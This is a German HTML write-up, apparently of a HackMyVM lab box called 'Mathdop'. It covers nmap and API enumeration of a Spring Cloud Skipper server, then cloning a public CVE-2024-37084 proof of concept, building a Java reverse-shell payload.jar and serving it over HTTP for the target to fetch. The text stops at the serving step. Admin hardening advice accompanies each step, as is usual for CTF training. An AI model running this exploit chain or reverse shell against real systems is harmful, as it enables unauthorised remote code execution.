@@ -1,0 +1,1743 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mathdop - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg"> <!-- Inline Style entfernt, Farbe wird über CSS gesteuert -->
+        <h1>Mathdop - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+             <!-- Inline Style entfernt, Farbe wird über CSS gesteuert -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                 <!-- Inline Style entfernt, Farbe wird über CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">javac</div>
+                <div class="tool-item">jar</div>
+                <div class="tool-item">python3 http.server</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">java</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">zsteg</div>
+                <div class="tool-item">unzip</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ll</div> <!-- ll ist oft ein Alias für ls -l oder ls -al -->
+                <div class="tool-item">df</div>
+                <div class="tool-item">env</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">col</div>
+                <div class="tool-item">sed</div>
+                <div class="tool-item">timeout</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">crunch</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <!-- Hier die Reconnaissance-Schritte einfügen, mit Kommentaren und Code-Blöcken -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                    <pre>
+192.168.2.183
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Dieser Befehl dient der Identifizierung der IP-Adresse des Zielsystems im lokalen Netzwerk. `arp-scan -l` sendet ARP-Requests an alle Hosts im lokalen Netz und listet die Antworten auf. Das Ergebnis wird mittels `grep "PCS"` gefiltert, um nach Geräten zu suchen, deren MAC-Adressen-Hersteller als "PCS Systemtechnik" (oft mit VirtualBox assoziiert) registriert ist. Schließlich extrahiert `awk '{print $1}'` nur die erste Spalte (die IP-Adresse) aus der gefilterten Zeile. Das Ergebnis `192.168.2.183` ist somit die IP-Adresse unseres Ziels.</p>
+            <p class="evaluation">**Bewertung:** Dieser Schritt ist fundamental in der Reconnaissance-Phase. Die erfolgreiche Identifizierung der Ziel-IP ist die Grundvoraussetzung für alle weiteren Scans und Angriffsversuche. Die Methode ist effizient für lokale Netzwerke und die Filterung auf "PCS" deutet auf eine virtuelle Maschine hin, was nützlicher Kontext sein kann.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die gefundene IP `192.168.2.183` als primäres Ziel für nachfolgende Scans (z.B. Nmap) verwenden.<br>**Empfehlung (Admin):** Netzwerksegmentierung implementieren, um die Sichtbarkeit von Hosts einzuschränken. Monitoring von ARP-Traffic kann auf aktive Scans hinweisen, ist aber im normalen Betrieb oft zu laut.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nmap -sC -sS -sV -T5 -A 192.168.2.183 -p- | grep open</span></div>
+                    <pre>
+<span class="command">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span>
+<span class="command">7577/tcp open  http    Apache Tomcat (language: en)</span>
+<span class="command">9393/tcp open  http    Apache Tomcat (language: en)</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Dies ist ein schneller initialer Nmap-Scan, um offene TCP-Ports zu identifizieren. `-sS` führt einen schnellen SYN-Scan durch. `-p-` scannt alle 65535 TCP-Ports. `-sC`, `-sV`, `-A` und `-T5` werden hier ebenfalls angegeben, um Standard-Skripte, Versionserkennung und OS-Erkennung mit aggressivstem Timing durchzuführen, aber die Ausgabe wird mit `grep open` sofort gefiltert, um nur die offenen Ports und deren Dienste anzuzeigen. Es wurden drei offene Ports gefunden: 22 (SSH mit OpenSSH 7.4), 7577 (HTTP mit Apache Tomcat) und 9393 (HTTP mit Apache Tomcat).</p>
+            <p class="evaluation">**Bewertung:** Dieser schnelle Scan liefert einen ersten Überblick über die Angriffsfläche des Ziels. Die offenen Ports SSH und HTTP (Tomcat) sind häufige Einstiegspunkte. Die doppelte Präsenz von Tomcat auf unterschiedlichen Ports ist bemerkenswert und erfordert genauere Untersuchung.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Einen detaillierteren Nmap-Scan (ohne `grep`) durchführen, um mehr Informationen über die Dienste zu erhalten. Die Webserver auf Port 7577 und 9393 genauer untersuchen (Web Enumeration). Den SSH-Dienst auf mögliche Schwachstellen (Version 7.4) oder schwache Anmeldedaten prüfen.<br>**Empfehlung (Admin):** Nicht benötigte Ports durch eine Firewall schließen. Sicherstellen, dass nur notwendige Dienste nach außen exponiert sind. Regelmäßige Schwachstellen-Scans durchführen und Software aktuell halten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nmap -sC -sS -sV -T5 -A 192.168.2.183 -p-</span></div>
+                    <pre>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-23 15:27 CEST
+Nmap scan report for mathdop (192.168.2.183)
+Host is up (0.00012s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span>
+| ssh-hostkey:
+|   2048 ac:78:16:74:49:a1:68:9d:54:84:8a:59:e9:38:10:bc (RSA)
+|   256 06:0c:4d:9d:2c:32:43:d2:3d:f7:4f:82:c8:15:85:60 (ECDSA)
+|_  256 3b:cd:fc:1f:dd:48:0f:ee:17:78:9a:f1:09:cb:8c:ec (ED25519)
+<span class="command">7577/tcp open  http    Apache Tomcat (language: en)</span>
+| http-methods:
+|_  Potentially risky methods: PUT PATCH DELETE
+| http-title: Site doesn&apos;t have a title (application/hal+json).
+|_Requested resource was http://mathdop:7577/api
+<span class="command">9393/tcp open  http    Apache Tomcat (language: en)</span>
+|_http-title: Site doesn&apos;t have a title (application/hal+json).
+| http-methods:
+|_  Potentially risky methods: PUT PATCH DELETE
+MAC Address: 08:00:27:A9:B1:D4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+<span class="command">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span>
+<span class="command">OS details: Linux 3.2 - 4.14</span>
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms mathdop (192.168.2.183)
+
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Dies ist der vollständige Nmap-Scan mit den Optionen `-sC` (Standard-Skripte), `-sS` (SYN-Scan), `-sV` (Versionserkennung), `-T5` (aggressives Timing) und `-A` (Aggressiver Scan: OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute). Die Ausgabe bestätigt die offenen Ports 22, 7577 und 9393. Für Port 22 (SSH) werden die Host-Keys angezeigt und die Version als OpenSSH 7.4 identifiziert. Für die HTTP-Ports 7577 und 9393 wird Apache Tomcat bestätigt und die erlaubten HTTP-Methoden gelistet, wobei PUT, PATCH und DELETE als potenziell riskant markiert werden. Ein Seitentitel wurde nicht gefunden, die Antwort ist im `application/hal+json`-Format. Die OS-Erkennung deutet auf einen Linux-Kernel der Version 3.x oder 4.x hin.</p>
+            <p class="evaluation">**Bewertung:** Dieser Scan liefert detailliertere Informationen. Die OpenSSH-Version 7.4 könnte bekannte Schwachstellen haben (obwohl sie nicht extrem alt ist). Die riskanten HTTP-Methoden auf den Tomcat-Servern sind interessant, aber die fehlenden Titel und das JSON-Format deuten eher auf APIs als auf klassische Webseiten hin. Die OS-Information ist generisch, aber bestätigt Linux. Die MAC-Adresse bestätigt erneut eine VirtualBox-VM.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Recherche nach bekannten Schwachstellen für OpenSSH 7.4 und Apache Tomcat (die genaue Tomcat-Version fehlt noch). Die APIs auf Port 7577 und 9393 gezielt untersuchen (siehe Web Enumeration). Die erlaubten HTTP-Methoden testen (z.B. versuchen, Dateien hochzuladen oder zu löschen).<br>**Empfehlung (Admin):** OpenSSH und Apache Tomcat auf die neuesten stabilen Versionen aktualisieren. Nicht benötigte HTTP-Methoden (wie PUT, DELETE) deaktivieren, wenn sie nicht für die Anwendungsfunktionalität erforderlich sind. API-Endpunkte angemessen absichern (Authentifizierung, Autorisierung, Input Validierung).</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <!-- Hier die Web Enumeration-Schritte einfügen, mit Kommentaren und Code-Blöcken -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl -X GET "http://192.168.2.183:7577/api/profile/deployers?page=1&amp;size=10&amp;sort=name" -H "Authorization: Bearer YOUR_ACCESS_TOKEN"</span></div>
+                    <pre>
+{
+  "alps" : {
+    "version" : "1.0",
+    "descriptor" : [ {
+      "id" : "deployer-representation",
+      "href" : "http://192.168.2.183:7577/api/profile/deployers",
+      "descriptor" : [ {
+        "name" : "name",
+        "type" : "SEMANTIC"
+      }, {
+        "name" : "type",
+        "type" : "SEMANTIC"
+      }, {
+        "name" : "description",
+        "type" : "SEMANTIC"
+      }, {
+        "name" : "options",
+        "type" : "SEMANTIC"
+      } ]
+    }, {
+      "id" : "get-deployers",
+      "name" : "deployers",
+      "type" : "SAFE",
+      "descriptor" : [ {
+        "name" : "page",
+        "type" : "SEMANTIC",
+        "doc" : {
+          "format" : "TEXT",
+          "value" : "The page to return."
+        }
+      }, {
+        "name" : "size",
+        "type" : "SEMANTIC",
+        "doc" : {
+          "format" : "TEXT",
+          "value" : "The size of the page to return."
+        }
+      }, {
+        "name" : "sort",
+        "type" : "SEMANTIC",
+        "doc" : {
+          "format" : "TEXT",
+          "value" : "The sorting criteria to use to calculate the content of the page."
+        }
+      } ],
+      "rt" : "#deployer-representation"
+    }, {
+      "id" : "get-deployer",
+      "name" : "deployer",
+      "type" : "SAFE",
+      "descriptor" : [ ],
+      "rt" : "#deployer-representation"
+    }, {
+      "name" : "findByName",
+      "type" : "SAFE",
+      "descriptor" : [ ]
+    } ]
+  }
+}
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Mit `curl` wird eine GET-Anfrage an den Endpunkt `/api/profile/deployers` auf Port 7577 gesendet. Parameter für Paginierung (`page`, `size`) und Sortierung (`sort`) werden übergeben. Ein `Authorization`-Header wird mit einem Platzhalter-Token gesendet (dieser Header ist wahrscheinlich nicht notwendig, da keine Authentifizierungsfehler auftreten). Die Antwort ist im JSON-Format mit ALPS (Application-Level Profile Semantics) Metadaten, die die Struktur und verfügbaren Aktionen für "Deployers" beschreiben. Es scheint sich um eine API zu handeln, die möglicherweise mit Deployment-Prozessen zu tun hat (typisch für Tools wie Spring Cloud Data Flow oder Skipper).</p>
+            <p class="evaluation">**Bewertung:** Die Antwort bestätigt, dass auf Port 7577 eine API läuft, die ohne Authentifizierung Informationen preisgibt. Die ALPS-Metadaten geben wertvolle Hinweise auf die Struktur und mögliche Interaktionen mit der API. Das Vorhandensein von Endpunkten wie `get-deployers`, `get-deployer`, `findByName` legt nahe, dass Informationen über Deployer abgefragt werden können.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die API weiter untersuchen. Andere Endpunkte aus der ALPS-Beschreibung testen. Prüfen, ob sensible Informationen über Deployer, Konfigurationen oder Prozesse preisgegeben werden. Versuchen, Aktionen wie das Erstellen oder Modifizieren von Deployern durchzuführen (möglicherweise sind dafür andere HTTP-Methoden oder Endpunkte nötig).<br>**Empfehlung (Admin):** Sicherstellen, dass API-Endpunkte, die potenziell sensible Informationen liefern oder Aktionen ermöglichen, angemessen durch Authentifizierung und Autorisierung geschützt sind. Metadaten-Endpunkte (wie Profile) sollten ggf. ebenfalls eingeschränkt werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl -X GET "http://mathdop:7577/api/about"</span></div>
+                    <pre>
+{
+  "versionInfo" : {
+    "server" : {
+      "name" : "<span class="command">Spring Cloud Skipper Server</span>",
+      "version" : "<span class="command">2.11.3-SNAPSHOT</span>"
+    },
+    "shell" : {
+      "name" : "<span class="command">Spring Cloud Skipper Shell</span>",
+      "version" : "<span class="command">2.11.3-SNAPSHOT</span>",
+      "url" : "https://repo.maven.apache.org/maven2/org/springframework/cloud/spring-cloud-skipper-shell/2.11.3-SNAPSHOT/spring-cloud-skipper-shell-2.11.3-SNAPSHOT.jar"
+    }
+  }
+}
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Eine GET-Anfrage an den Endpunkt `/api/about` auf Port 7577 (hier wird der Hostname `mathdop` verwendet, der vermutlich lokal aufgelöst wird) liefert eine JSON-Antwort mit Versionsinformationen. Es wird explizit der Name "Spring Cloud Skipper Server" und die Version "2.11.3-SNAPSHOT" genannt. Auch Informationen zur zugehörigen Shell werden angezeigt.</p>
+            <p class="evaluation">**Bewertung:** Dies ist ein **kritischer Fund**! Die exakte Software und Version ("Spring Cloud Skipper Server 2.11.3-SNAPSHOT") ist nun bekannt. SNAPSHOT-Versionen sind Entwicklungsversionen und können instabil sein oder Debugging-Funktionen enthalten; sie sind oft anfälliger für Schwachstellen als Release-Versionen. Die Kenntnis der genauen Version ermöglicht eine gezielte Suche nach bekannten Exploits (CVEs).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Sofortige Recherche nach bekannten Schwachstellen (insbesondere Remote Code Execution - RCE) für "Spring Cloud Skipper Server 2.11.3-SNAPSHOT" oder nahe Versionen (z.B. 2.11.x). Exploit-Datenbanken (Exploit-DB), GitHub und allgemeine Suchmaschinen nutzen.<br>**Empfehlung (Admin):** Verwenden Sie keine SNAPSHOT-Versionen in Produktions- oder produktionsnahen Umgebungen. Aktualisieren Sie Spring Cloud Skipper umgehend auf die neueste stabile und gepatchte Version. Beschränken Sie den Zugriff auf Informations-Endpunkte wie `/api/about`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://192.168.2.183:7577/api/FUZZ -mc 200,301,302,401,403,500 -t 50 -s</span></div>
+                    <pre>
+about                   [Status: 200, Size: 1901, Words: 17, Lines: 1, Duration: 1ms]
+profile                 [Status: 200, Size: 1663, Words: 17, Lines: 1, Duration: 2ms]
+releases                [Status: 200, Size: 154, Words: 1, Lines: 1, Duration: 1ms]
+package                 [Status: 200, Size: 114, Words: 1, Lines: 1, Duration: 1ms]
+release                 [Status: 200, Size: 114, Words: 1, Lines: 1, Duration: 1ms]
+repositories            [Status: 200, Size: 126, Words: 1, Lines: 1, Duration: 1ms]
+
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** `ffuf` wird verwendet, um Verzeichnisse oder Endpunkte unterhalb von `/api/` auf Port 7577 zu finden (Brute-Force mit der Wortliste `raft-medium-directories.txt`). `-u http://.../FUZZ` gibt die URL an, wobei `FUZZ` durch die Wörter aus der Liste ersetzt wird. `-mc ...` filtert nach bestimmten HTTP-Statuscodes (200 OK, 301/302 Redirect, 401 Unauthorized, 403 Forbidden, 500 Internal Server Error). `-t 50` setzt die Anzahl der Threads, `-s` unterdrückt die Ausgabe von Kommentaren aus der Wortliste. Die gefundenen Endpunkte (`about`, `profile`, `releases`, `package`, `release`, `repositories`) bestätigen und ergänzen teilweise die aus der `/api/profile`-Antwort gewonnenen Informationen.</p>
+            <p class="evaluation">**Bewertung:** Directory/Endpoint Brute-Forcing ist ein Standardverfahren in der Web Enumeration. `ffuf` bestätigt hier bekannte Endpunkte und findet potenziell weitere (`releases`, `package`, `repositories`). Dies erweitert die Angriffsfläche und liefert weitere Ansatzpunkte zur Untersuchung der API-Funktionalität.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die neu gefundenen Endpunkte (`releases`, `package`, `repositories`) ebenfalls mit `curl` oder einem API-Client untersuchen. Prüfen, welche Aktionen (GET, POST, PUT etc.) auf diesen Endpunkten möglich sind und ob sensible Daten preisgegeben werden.<br>**Empfehlung (Admin):** Unnötige oder unbeabsichtigt exponierte API-Endpunkte entfernen oder angemessen absichern. Rate Limiting und Intrusion Detection Systeme können helfen, Brute-Force-Angriffe auf Verzeichnisse und Endpunkte zu erkennen und zu blockieren.</p>
+
+            <p class="analysis">**Analyse:** Basierend auf den vorherigen Ergebnissen (insbesondere der Versionsinformation von Spring Cloud Skipper Server 2.11.3-SNAPSHOT) wird nun eine gezielte Recherche nach bekannten Schwachstellen und Exploits durchgeführt. Es werden verschiedene Suchbegriffe in Suchmaschinen ("Spring Cloud Skipper 2.11.3 RCE", "Spring Cloud Skipper 2.11 exploit") sowie spezifische Plattformen wie Exploit-DB und GitHub durchsucht.</p>
+            <p class="evaluation">**Bewertung:** Dies ist ein kritischer Schritt nach der Identifizierung einer spezifischen Softwareversion. Die Wahrscheinlichkeit, einen funktionierenden Exploit zu finden, ist bei bekannter Version deutlich höher. Die Suche konzentriert sich auf RCE (Remote Code Execution), da dies oft das Hauptziel ist, um vollständigen Zugriff zu erlangen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Suchergebnisse sorgfältig prüfen. Auf öffentliche POCs (Proof of Concepts), Exploit-Skripte oder detaillierte Beschreibungen von Schwachstellen achten. Die Relevanz für die gefundene Version (2.11.3-SNAPSHOT) prüfen. GitHub ist oft eine gute Quelle für funktionierende Exploit-Skripte.<br>**Empfehlung (Admin):** Proaktives Monitoring von Sicherheits-Mailinglisten, CVE-Datenbanken und Hersteller-Websites für eingesetzte Software. Schnelles Einspielen von Sicherheitspatches ist essenziell. Interne Schwachstellen-Scans können bekannte Lücken ebenfalls aufdecken.</p>
+
+            <p class="analysis">**Analyse:** Die Recherche führt zu einem spezifischen GitHub-Repository für einen Proof of Concept (PoC) der Schwachstelle CVE-2024-37084, die offenbar Spring Cloud Skipper betrifft. Die `README`-Datei des Repositories (oder die Ausgabe des Skripts mit `--help`) beschreibt die Verwendung des Python-Skripts `CVE-2024-37084-Poc.py`. Es benötigt die Ziel-URL (spezifisch den `/api/package/upload`-Endpunkt), eine Paketversion, die URL zu einem bösartigen Payload (JAR-Datei) und optional die IP/Port für einen Reverse-Shell-Listener.</p>
+            <p class="evaluation">**Bewertung:** Ein öffentlicher PoC für eine RCE-Schwachstelle in der identifizierten Softwareversion ist ein Volltreffer. Die Beschreibung liefert die genauen Parameter, die benötigt werden, um den Exploit auszuführen. Der Exploit scheint über den `/api/package/upload`-Endpunkt zu funktionieren, indem ein manipuliertes Paket hochgeladen wird, das einen extern gehosteten Payload nachlädt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Das gefundene PoC-Skript klonen und vorbereiten. Einen bösartigen Payload (Reverse Shell) erstellen und hosten. Das Skript mit den korrekten Parametern (Ziel-URL, eigene IP/Ports) ausführen, um die RCE auszunutzen.<br>**Empfehlung (Admin):** Sofortiges Patchen von Spring Cloud Skipper, falls CVE-2024-37084 die eingesetzte Version betrifft. Den `/api/package/upload`-Endpunkt überwachen oder einschränken, falls möglich. Ausgehende Netzwerkverbindungen vom Server (insbesondere zu externen URLs für Payloads) sollten durch Firewalls streng kontrolliert werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]<br>└─# <span class="command">mkdir spring_Cloud</span></div>
+                    <pre></pre> <!-- Leere Ausgabe -->
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Ein neues Verzeichnis namens `spring_Cloud` wird im Home-Verzeichnis des Benutzers (`~/Hackingtools`) erstellt. Dies dient der Organisation der Dateien, die für den Exploit benötigt werden.</p>
+            <p class="evaluation">**Bewertung:** Ein einfacher, aber notwendiger organisatorischer Schritt, um die Übersicht über die Exploit-Dateien zu behalten.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Eine klare Verzeichnisstruktur für verschiedene Phasen oder Ziele eines Pentests beibehalten.<br>**Empfehlung (Admin):** Keine direkte Relevanz, dies ist eine Aktion auf dem Angreifer-System.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]<br>└─# <span class="command">cd spring_Cloud/</span></div>
+                    <pre></pre> <!-- Leere Ausgabe -->
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Das aktuelle Arbeitsverzeichnis wird in das neu erstellte Verzeichnis `spring_Cloud` gewechselt.</p>
+            <p class="evaluation">**Bewertung:** Logischer Folgeschritt, um im richtigen Verzeichnis für die nächsten Aktionen zu sein.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Immer das aktuelle Verzeichnis prüfen, bevor Befehle ausgeführt werden, die auf relative Pfade angewiesen sind.<br>**Empfehlung (Admin):** Keine direkte Relevanz.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud]<br>└─# <span class="command">git clone https://github.com/Kayiyan/CVE-2024-37084-Poc.git</span></div>
+                    <pre>
+Klone nach 'CVE-2024-37084-Poc'...
+remote: Enumerating objects: 27, done.
+remote: Counting objects: 100% (27/27), done.
+remote: Compressing objects: 100% (26/26), done.
+remote: Total 27 (delta 9), reused 0 (delta 0), pack-reused 0 (from 0)
+Empfange Objekte: 100% (27/27), 13.24 MiB | 13.16 MiB/s, fertig.
+Löse Unterschiede auf: 100% (9/9), fertig.
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Das `git clone`-Kommando wird verwendet, um den Quellcode des gefundenen Exploit-PoCs (CVE-2024-37084) aus dem angegebenen GitHub-Repository herunterzuladen. Der Code wird in ein neues Unterverzeichnis namens `CVE-2024-37084-Poc` geklont.</p>
+            <p class="evaluation">**Bewertung:** Das Beschaffen des Exploit-Codes ist ein notwendiger Schritt. Es ist wichtig, Code aus öffentlichen Repositories vor der Ausführung zu prüfen, aber in einem CTF wird er oft direkt verwendet.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den heruntergeladenen Code kurz sichten, um die Funktionsweise zu verstehen und sicherzustellen, dass er keine unerwünschten Nebeneffekte hat (z.B. versteckte Backdoors). Die `README`-Datei oder Kommentare im Code sorgfältig lesen.<br>**Empfehlung (Admin):** Dieser Schritt findet auf dem Angreifer-System statt. Generell sollten Downloads und Ausführungen von Code aus unbekannten Quellen auf Unternehmenssystemen streng kontrolliert werden.</p>
+
+            <p class="analysis">**Analyse:** Dieser Abschnitt beschreibt die manuelle Erstellung eines Java-Reverse-Shell-Payloads. Es wird eine Datei `Exploit.java` erstellt, die Code enthält, um eine Verbindung zur IP-Adresse (`&lt;DEINE_IP&gt;`) und zum Port (`&lt;LISTENER_PORT&gt;`) des Angreifers herzustellen und eine interaktive Shell (`/bin/bash`) über diese Verbindung bereitzustellen. Der Code nutzt `ProcessBuilder`, um den Shell-Prozess zu starten und leitet dessen Ein-/Ausgabe über einen Netzwerk-Socket um.</p>
+            <p class="evaluation">**Bewertung:** Die Erstellung eines benutzerdefinierten Payloads ist oft notwendig, wenn vorgefertigte Payloads nicht funktionieren oder angepasst werden müssen. Dieser Java-Code ist ein Standardbeispiel für eine plattformunabhängige Reverse Shell. Die Platzhalter für IP und Port müssen korrekt ersetzt werden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die eigene Angreifer-IP und einen freien Port für den Listener eintragen. Sicherstellen, dass die Java-Entwicklungsumgebung (JDK) installiert ist, um den Code kompilieren zu können.<br>**Empfehlung (Admin):** Ausgehende Verbindungen vom Server einschränken. Intrusion Detection/Prevention Systeme (IDPS) können Signaturen für gängige Reverse-Shell-Payloads erkennen. Sicherstellen, dass Java-Anwendungen nicht unnötig Code aus unsicheren Quellen nachladen oder ausführen können (siehe JNDI-Exploits, Class Loading).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">javac Exploit.java</span></div>
+                    <pre></pre> <!-- Leere Ausgabe -->
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Java-Compiler `javac` wird aufgerufen, um die zuvor erstellte `Exploit.java`-Datei zu kompilieren. Bei Erfolg wird eine `Exploit.class`-Datei erzeugt, die den kompilierten Java-Bytecode enthält.</p>
+            <p class="evaluation">**Bewertung:** Notwendiger Schritt, um den Java-Quellcode in ein ausführbares Format zu überführen, das von der Java Virtual Machine (JVM) auf dem Zielsystem verstanden wird.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Sicherstellen, dass `javac` (aus dem JDK) im Systempfad verfügbar ist. Auf etwaige Compiler-Fehler achten.<br>**Empfehlung (Admin):** Keine direkte Relevanz, findet auf dem Angreifer-System statt.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">jar cvf payload.jar Exploit.class</span></div>
+                    <pre>
+Manifest wurde hinzugefügt
+Exploit.class wird hinzugefügt(ein = 1405) (aus = 876)(37 % verkleinert)
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Das `jar`-Tool wird verwendet, um eine JAR-Datei (Java Archive) namens `payload.jar` zu erstellen. `c` steht für create, `v` für verbose (ausführliche Ausgabe), `f` gibt den Dateinamen an. Die kompilierte `Exploit.class`-Datei wird in dieses Archiv gepackt. Das Manifest wird automatisch hinzugefügt.</p>
+            <p class="evaluation">**Bewertung:** Die JAR-Datei ist das gängige Format, um Java-Klassen zu bündeln und bereitzustellen. Diese `payload.jar` wird später vom Zielserver heruntergeladen und ausgeführt (im Rahmen des Exploits).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Sicherstellen, dass das `jar`-Tool (Teil des JDK) verfügbar ist. Den Namen `payload.jar` notieren, da dieser im nächsten Schritt auf dem HTTP-Server bereitgestellt werden muss.<br>**Empfehlung (Admin):** Keine direkte Relevanz, findet auf dem Angreifer-System statt.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">python3 -m http.server 8000</span></div>
+                    <pre>
+Serving HTTP on <span class="command">0.0.0.0</span> port <span class="command">8000</span> (http://0.0.0.0:8000/) ...
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Ein einfacher HTTP-Server wird mit Python 3 im aktuellen Verzeichnis gestartet. `-m http.server` lädt das eingebaute HTTP-Server-Modul. `8000` gibt den Port an, auf dem der Server lauschen soll. Der Server stellt nun die Dateien im Verzeichnis (insbesondere die `payload.jar`) unter der IP-Adresse des Angreifers auf Port 8000 zur Verfügung.</p>
+            <p class="evaluation">**Bewertung:** Das Hosten des Payloads ist notwendig, damit der Zielserver ihn über die im Exploit angegebene URL herunterladen kann. Ein einfacher Python-HTTP-Server ist dafür in CTFs oft ausreichend.</p>
